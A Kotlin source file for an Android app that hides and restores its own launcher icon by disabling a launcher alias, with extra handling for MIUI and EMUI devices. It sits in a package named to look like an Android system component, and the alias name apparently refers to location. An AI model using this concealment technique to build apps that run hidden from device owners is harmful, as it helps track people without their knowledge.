package com.android.system.manager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object AppVisibilityManager {
    private const val ALIAS = "com.joylashuv.MainLauncherAlias"

    fun hideAppIcon(context: Context) {
        val pm = context.packageManager
        // Always disable alias (works on most brands)
        pm.setComponentEnabledSetting(
            ComponentName(context.packageName, ALIAS),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        // MIUI / EMUI fallback: also disable MainActivity
        if (isMiui() || isEmui()) {
            pm.setComponentEnabledSetting(
                ComponentName(context.packageName, "${context.packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    fun showAppIcon(context: Context) {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(context.packageName, ALIAS),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        if (isMiui() || isEmui()) {
            pm.setComponentEnabledSetting(
                ComponentName(context.packageName, "${context.packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    fun isIconVisible(context: Context): Boolean {
        val state = context.packageManager.getComponentEnabledSetting(
            ComponentName(context.packageName, ALIAS)
        )
        return state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    private fun isMiui(): Boolean =
        !getSystemProperty("ro.miui.ui.version.name").isNullOrEmpty()

    private fun isEmui(): Boolean =
        !getSystemProperty("ro.build.version.emui").isNullOrEmpty()

    private fun getSystemProperty(key: String): String? = try {
        val clazz = Class.forName("android.os.SystemProperties")
        clazz.getMethod("get", String::class.java).invoke(null, key) as? String
    } catch (e: Exception) {
        null
    }
}
